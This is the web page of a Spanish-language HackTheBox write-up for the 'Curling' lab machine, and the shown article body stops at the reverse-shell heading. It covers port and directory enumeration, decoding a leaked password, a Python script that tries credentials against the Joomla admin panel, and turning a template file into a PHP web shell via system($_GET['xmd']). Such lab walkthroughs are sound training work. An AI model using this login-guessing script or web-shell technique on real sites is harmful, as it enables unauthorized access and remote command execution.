@@ -1,0 +1,1729 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Curling</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Curling | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Curling" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel fácil. Ojos bien abiertos en la página web, jueguitos con templates de Joomla, loops de backups (?), movimientos sensuales con un archivo de configuración de cURL y ayudamos al usuario root a renovar su contraseña modificando el archivo /etc/shadow." />
+<meta property="og:description" content="Máquina Linux nivel fácil. Ojos bien abiertos en la página web, jueguitos con templates de Joomla, loops de backups (?), movimientos sensuales con un archivo de configuración de cURL y ayudamos al usuario root a renovar su contraseña modificando el archivo /etc/shadow." />
+<link rel="canonical" href="http://localhost:4000/htb/curling" />
+<meta property="og:url" content="http://localhost:4000/htb/curling" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-21T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160banner.png" />
+<meta property="twitter:title" content="HackTheBox - Curling" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-08-21T00:00:00-07:00","datePublished":"2021-08-21T00:00:00-07:00","description":"Máquina Linux nivel fácil. Ojos bien abiertos en la página web, jueguitos con templates de Joomla, loops de backups (?), movimientos sensuales con un archivo de configuración de cURL y ayudamos al usuario root a renovar su contraseña modificando el archivo /etc/shadow.","headline":"HackTheBox - Curling","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/curling"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/curling"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Curling</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-08-21">21 Aug 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160banner.png" alt="HackTheBox - Curling">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel fácil. Ojos bien abiertos en la página web, jueguitos con <strong>templates</strong> de <strong>Joomla</strong>, loops de backups (?), movimientos sensuales con un archivo de configuración de <strong>cURL</strong> y ayudamos al usuario <strong>root</strong> a renovar su contraseña modificando el archivo <strong>/etc/shadow</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160curlingHTB.png" alt="160curlingHTB" /></p>
+
+<h2 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h2>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/29267">L4mpje</a>.</p>
+
+<p>Juegue juegue, todo pelota!</p>
+
+<p>Encontraremos un servidor web con el <strong>gestor de contenido <code>Joomla</code></strong> bastante juguetón, inspeccionaremos código y texto para extraer credenciales. Estas nos serán válidas contra el panel admin de <strong>Joomla</strong>. Estando dentro modificaremos un <code>template</code> para que interprete código <code>PHP</code> “malicioso”, usaremos esto para obtener una <strong>Reverse Shell</strong> como el usuario <code>www-data</code>.</p>
+
+<p>En el sistema, específicamente en la carpeta <code>/home</code> del usuario <code>floris</code> encontraremos un archivo llamado <code>password_backup</code>, el tipo de archivo nos indicará que es un comprimido, pero al descomprimirlo obtenemos otro comprimido, jugaremos con eso para después de unas cuantas descompresiones obtener el archivo <code>password.txt</code> y conseguir una <strong>Shell</strong> como el usuario <strong>floris</strong> en el sistema.</p>
+
+<p>Nos daremos cuenta de que el usuario <code>root</code> esta ejecutando unas instrucciones automatizadas que interactúan con dos archivos a los que tenemos acceso, <code>input</code> y <code>report</code>. <strong><em>input</em></strong> es un archivo de configuración de <code>cURL</code> (o sea, toma el contenido y si son comandos usados por <strong>curl</strong>, los ejecuta) y <strong><em>report</em></strong> guarda la respuesta de la petición o configuración dada en <strong><em>input</em></strong>. Haremos que el archivo <code>input</code> lea archivos del sistema jugando con <code>file://</code>, como la instrucción la ejecuta <strong><em>root</em></strong> podemos leer cualquier archivo.</p>
+
+<p>Usaremos esa habilidad para modificar el archivo <code>/etc/shadow</code> con otra contraseña para el usuario <strong><em>root</em></strong>, esto para obtener una <strong>Shell</strong> en el sistema como él.</p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Algo juguetona, pero toca temas realistas y conocidos.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Vivo vivito.</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con nmap</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Recorremos <strong>CMS Joomla</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#joomla-template-rce">Modificamos <strong>template</strong> de <strong>Joomla</strong> para conseguir <strong>ejecución remota de comandos</strong></a>.</li>
+      <li><a href="#joomla-template-rce-reverseshell">Obtenemos <strong>Reverse Shell</strong> en el sistema como <u>www-data</u></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#backupassword-floris">Movimiento lateral <strong>backup_password</strong>: Vamos de <strong>www-data</strong> a <strong>floris</strong></a>.
+    <ul>
+      <li><a href="#password-decompress">Jugamos a descomprimir el comprimido del comprimido</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.
+    <ul>
+      <li><a href="#breaking-curlfig">Explotando el archivo que toma <strong>cURL</strong> como “configuración”</a>.</li>
+      <li><a href="#shadow-root">Cambiamos la contraseña del usuario <strong>root</strong> para obtener una <strong>Shell</strong></a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">📌</a></h2>
+
+<p>Inicialmente necesitamos saber que puertos tiene abiertos la máquina, los descubriremos con <code>nmap</code>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.150 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos devuelve dos puertos:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Thu Aug 19 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.150
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.150 ()	Status: Up
+Host: 10.10.10.150 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+# Nmap done at Thu Aug 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 104.58 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/">SSH</a></strong>: Tenemos la opción de obtener una Shell de forma segura.</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Esta sirviendo un servidor web.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Ahora tenemos que profundizar un poco, necesitamos saber que versiones y script están siendo ejecutad@s por cada servicio (puerto), así nuestra próxima investigación es muuucho más pequeña:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.150
+    [*] Open ports: 22,80
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 22,80 -sC -sV 10.10.10.150 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Thu Aug 19 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.150
+Nmap scan report for 10.10.10.150
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
+|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
+|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Aug 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 12.56 seconds
+</code></pre>
+
+<p>Tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 7.6p1</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.29</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Lo único llamativo es <code>Joomla</code>, que es un <em>gestor de contenido</em> web. Sigamos profundizando a ver que encontramos.</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-80">Puerto 80 <a href="#puerto-80">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>De primeras vemos 4 cosas interesantes:</p>
+
+<ul>
+  <li>El título hace referencia a <strong>dos herramientas</strong>: <code>cewl</code> (para extraer el texto de una página web y convertirlo en un objeto de palabras (como un diccionario)) y <code>curl</code> (para realizar peticiones web desde una consola).</li>
+  <li>Estamos ante el <strong>CMS (gestor de contenido)</strong> <code>Joomla</code>.</li>
+  <li>Y hay un <strong>login panel</strong>.</li>
+</ul>
+
+<hr />
+
+<p>🌈 <strong><em><code>Joomla</code> como dijimos es un gestor de contenido que permite crear sitios web intuitivos, dinámicos e interactivos. Contiene así mismo un -panel administrativo- el cual sirve para modificar toooooodo el contenido que contenga la web.</em></strong></p>
+
+<p>Si revisamos la interfaz web vemos mucho texto, esto junto a la referencia de <code>cewl</code> nos podría indicar que debemos crear un diccionario de toooooooodas las palabras e intentar hacer un ataque de fuerza bruta contra el login. Pero claro, nos faltaría saber el usuario con el que probar cada palabra…</p>
+
+<p>Leyendo por encima los anuncios nos damos cuenta de que hay dos referencias a posibles usuarios e incluso una cadena que podría ser una contraseña:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_readingHOME_possibleCREDS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, ya tendríamos 3 usuarios con los cuales podríamos probar cada palabra de la web:</p>
+
+<ul>
+  <li><code>Super User</code> o <code>SuperUser</code> o <code>superuser</code> y distintas variantes.</li>
+  <li><code>Floris</code> o <code>floris</code> y variaciones.</li>
+  <li><code>pebble</code> o <code>Pebble</code>, etc.</li>
+</ul>
+
+<p>Antes de eso veamos si existe algún recurso que el servidor esté sirviendo, pero que no veamos a simple vista:</p>
+
+<pre><code class="language-bash">❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.10.150/
+...
+Target: http://10.10.10.150/
+
+[25:25:25] Starting: 
+[25:25:25] 301 -  320B  - /administrator  -&gt;  http://10.10.10.150/administrator/
+[25:25:25] 301 -  310B  - /bin  -&gt;  http://10.10.10.150/bin/
+[25:25:25] 301 -  312B  - /cache  -&gt;  http://10.10.10.150/cache/
+[25:25:25] 301 -  317B  - /components  -&gt;  http://10.10.10.150/components/
+[25:25:25] 301 -  313B  - /images  -&gt;  http://10.10.10.150/images/
+[25:25:25] 301 -  315B  - /includes  -&gt;  http://10.10.10.150/includes/
+[25:25:25] 200 -   14KB - /index.php
+[25:25:25] 301 -  315B  - /language  -&gt;  http://10.10.10.150/language/
+[25:25:25] 301 -  314B  - /layouts  -&gt;  http://10.10.10.150/layouts/
+[25:25:25] 301 -  316B  - /libraries  -&gt;  http://10.10.10.150/libraries/
+[25:25:25] 301 -  312B  - /media  -&gt;  http://10.10.10.150/media/
+[25:25:25] 301 -  314B  - /modules  -&gt;  http://10.10.10.150/modules/
+[25:25:25] 301 -  314B  - /plugins  -&gt;  http://10.10.10.150/plugins/
+[25:25:25] 403 -  300B  - /server-status
+[25:25:25] 301 -  316B  - /templates  -&gt;  http://10.10.10.150/templates/
+[25:25:25] 301 -  310B  - /tmp  -&gt;  http://10.10.10.150/tmp/
+</code></pre>
+
+<p>Vemos varios recursos y la mayoría son <strong>redirects</strong>, pero redireccionan al mismo recurso…</p>
+
+<p>Todos son objetos que usa <code>Joomla</code> en su ejecución y funcionamiento, pero hay dos llamativos <code>administrator</code> y <code>tmp</code>. Revisando cada uno, simplemente <strong>administrator</strong> nos devuelve algo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_administrator.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Recuerdan que en la definición de <strong>Joomla</strong> dijimos que existe un <strong>*panel administrativo</strong> el cual sirve para modificar tooooooodo lo relacionado con el sitio web, pues es este (: Pero de nuevo estamos F, no hay credenciales para probar (además de las default, pero que no funcionan).</p>
+
+<p>Ya con nada más a enumerar, tenía puesto en mi mente el crear el script para jugar (pero no sabía que me faltaba algo que siempre hago y que esta vez se me olvido (¿ya saben que puede ser?), genere la estructura del script, empece a armar las funciones y las demás cositas. Llego el momento de ver si existían tokens o variables locas que viajaban entre el formulario, con lo cual era necesario ver la estructura (HTML) de la web.</p>
+
+<p>En este caso lo que veremos ahora lo encontré al ejecutar un script en <code>Python</code> y viendo la respuesta de una petición web con el método <code>GET</code> hacia el <strong><em>home (<code>index.php</code>)</em></strong>, pero también se puede ver simplemente inspeccionando el código fuente <code>HTML</code>.</p>
+
+<pre><code class="language-py">...
+import requests
+
+URL = "http://10.10.10.150"
+
+r = requests.get(URL)
+print(r.text)
+...
+</code></pre>
+
+<p>En su ejecución la respuesta (<code>r.text</code>) nos muestra algo curioso al final:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_scriptPY_rTEXThome_secretsTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>VAYA VAYAAAAAAAAAAAaa lo que vemoooooooooooooos, hay un comentario que dice <code>secret.txt</code>, o sea referencia un archivo <code>.txt</code>, si intentamos buscarlo como recurso de la web, l o e n c o n t r a m o s:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_secretsTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Una cadena extraña, pero tiene tintes de estar encodeada en <a href="https://es.wikipedia.org/wiki/Base64">base64</a>, validémoslo intentando decodificarla:</p>
+
+<pre><code class="language-bash">❱ echo "Q3VybGluZzIwMTgh" | base64 -d
+Curling2018!
+</code></pre>
+
+<p>OIEEEEEEEEEEEEEEeeeEeeee, eso sí que parece una contraseña eh! Bastante feo, raro y mehh que este ese recurso ahí en la web como si nada y con un comentario en el <strong>home</strong> referenciándola, pero bueno, sigamos…</p>
+
+<p>Ya tenemos dos cadenas que parecen contraseñas:</p>
+
+<ul>
+  <li><code>curling2018</code>.</li>
+  <li><code>Curling2018!</code>.</li>
+</ul>
+
+<p>Y tenemos los usuarios de antes, pues en vez de jugar con diccionarios probemos rápidamente cada usuario “potencial” con las dos contraseñas:</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import requests
+import signal
+import re
+
+# Variables -----------------------.
+URL = "http://10.10.10.150/administrator/index.php"
+
+# Funciones -----------------------.
+def def_handler(sig, frame):  # Ctrl+C
+    print("\nsaLi3ndoo..\n")
+    exit(0)
+
+signal.signal(signal.SIGINT, def_handler)
+
+def login(username, password):  # tryLogin
+    # Generamos una nueva sesión para cada intento
+    session = requests.Session()
+
+    # Extraemos tokens de sesión
+    r = session.get(URL)
+    hidden_return_value = re.findall(r'&lt;input type="hidden" name="return" value="(.*?)"', r.text)[0]
+    hidden_csrf_token_value = re.findall(r'&lt;script type="application/json" class="joomla-script-options new"&gt;{"csrf.token":"(.*?)"', r.text)[0]
+
+    data_post = {
+        "username": username,
+        "passwd": password,
+        "option": "com_login",
+        "task": "login",
+        "return": hidden_return_value,
+        hidden_csrf_token_value: "1"
+    }
+    r = session.post(URL, data=data_post)
+
+    if "Username and password do not match or you do not have an account yet" not in r.text:
+        print(f"Credenciales válidas: {username}:{password}")
+        exit(0)
+
+def main():  # elCentrico
+    array_users = ["Super User", "Floris", "plebbe"]
+    array_passwords = ["curling2018", "Curling2018!"]
+
+    for username in array_users:
+        for password in array_passwords:
+            # Enviamos el usuario con algunas variantes, como MAYUSCULAS, minusculas, quitando espacios, etc.
+            login(username.lower(), password)
+            login(username.upper(), password)
+            login(username.replace(' ',''), password)
+            login(username.replace(' ','').lower(), password)
+            login(username.replace(' ','').upper(), password)
+
+    print("Ninguna credencial es válida...")
+
+# Inicio del programa -------------.
+if __name__ == '__main__':
+    main()
+</code></pre>
+
+<p>Si lo ejecutamos, tenemoooooooooooooooooooooooos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160bash_scriptPY_fuzzUsers_validCREDSjoomla.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OPAAAAAAAAAAAAAAAAAAAAAAA, pues validémoslas en la web:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_administrator_LOGIN_DONEasFLORIS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y SIII, tamos dentro (:</p>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p>🔥 <a href="#joomla-template-rce-reverseshell">Si ya sabes como conseguir <strong>RCE</strong> modificando el template en <strong>Joomla</strong> puedes evitar mi explicación e ir directamente a como obtuvimos la <strong>Reverse Shell</strong></a>.</p>
+
+<p>Ya dentro el conseguir una ejecución remota de comandos es muy sencillo, sigamos un post que me gusta mucho:</p>
+
+<ul>
+  <li><a href="https://www.hackingarticles.in/joomla-reverse-shell/">Joomla Reverse Shell</a>.</li>
+</ul>
+
+<p>Lo único que debemos hacer es modificar el contenido de un <code>template</code>, existen varios objetos, modificamos uno de ellos con nuestro código <code>PHP</code> y ya la web lo interpretaría (:</p>
+
+<p>Por ejemplo hagamos que la web ejecute el comando <code>whoami</code> y que nos lo muestre:</p>
+
+<hr />
+
+<h2 id="joomla-template-rce">Modificamos <u>template</u> para conseguir <u>RCE</u> <a href="#joomla-template-rce">📌</a></h2>
+
+<p>Debemos seguir esta ruta de clics, primero <code>extensions</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_extensions.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Después <code>templates</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_extensions_templates.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Vemos algo así:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_templates.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Damos clic en donde indica la flecha y llegamos a este apartado:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_templates_list.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Seleccionamos cualquiera de los dos <strong><em>templates</em></strong>, yo usaré <code>Beez3</code>, damos clic en su nombre y veríamos esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_templateFILES_beez3.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Yo modificaré el archivo <code>error.php</code>, damos clic sobre él y empezamos a jugar…</p>
+
+<p>El contenido original no nos interesa, lo borramos (o guardamos en algún lado para después volverlo dejar como si no hubiéramos modificado nada 🤭) y retomamos la idea de ejecutar <code>whoami</code>, el archivo quedaría así:</p>
+
+<pre><code class="language-php">&lt;?php system("whoami"); ?&gt;
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_template_beez3_errorPHP_whoami.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<ul>
+  <li><a href="https://www.php.net/manual/es/function.system.php">Manual PHP - system()</a>.</li>
+</ul>
+
+<hr />
+
+<p>Lo siguiente será guardar el nuevo contenido del archivo <code>error.php</code>, damos <code>Save</code> y veríamos este mensaje:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_dashboard_template_beez3_errorPHP_saved.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Perfecto, ahora solo debemos ver el contenido <strong>interpretado</strong>, siguiendo esta ruta llegamos al objeto <code>error.php</code>:</p>
+
+<pre><code class="language-html">http://10.10.10.150/templates/beez3/error.php
+</code></pre>
+
+<p>Yyyyy en la web veríamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_templateBEEZ3_errorPHP_whoamiRCE_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>OJOOOOOOOOOOOOOOOOOOOOOO, vemos que no hay errores y por el contrario se nos interpreta el contenido, nos indica que el usuario que ejecuta el servicio <strong>Joomla</strong> es <code>www-data</code>. ASÍ QUEEEEEE TEEEENEEEEEMOOOOOS ejecución remota de comandos sobre el sistema (:</p>
+
+<p>Entablémonos una reverse Shell…</p>
+
+<p>Podemos indicárselo en el mismo <code>sy, pero A MÍ me gusta guardar una variable desde el método </code>GET<code> que su contenido sea el que interprete la función </code>system()<code>, así no tenemos que estar modificando el contenido del template y solo jugamos con la variable </code>xmd<code>, veamos un ejemplo rápido. Esta sería la estructura del archivo </code>error.php`:</p>
+
+<pre><code class="language-php">&lt;?php system($_GET['xmd']); ?&gt;
+</code></pre>
+
+<p>Donde la petición recibirá una variable llamada <code>xmd</code> que contendrá nuestro comando y ese comando sería ejecutado por la función <code>system()</code>.</p>
+
+<p>Guardamos y validamos el archivo en la web, ahora ejecutemos <code>hostname</code>:</p>
+
+<pre><code class="language-html">http://10.10.10.150/templates/beez3/error.php?xmd=hostname
+</code></pre>
+
+<p>Yyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160page80_templateBEEZ3_errorPHP_GETvarXMD_hostnameRCE_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>LISTOOOONES, ahora si hagamos una reverse Shell (:</p>
+
+<hr />
+
+<h2 id="joomla-template-rce-reverseshell">Obtenemos <u>Shell</u> en el sistema como <u>www-data</u> <a href="#joomla-template-rce-reverseshell">📌</a></h2>
+
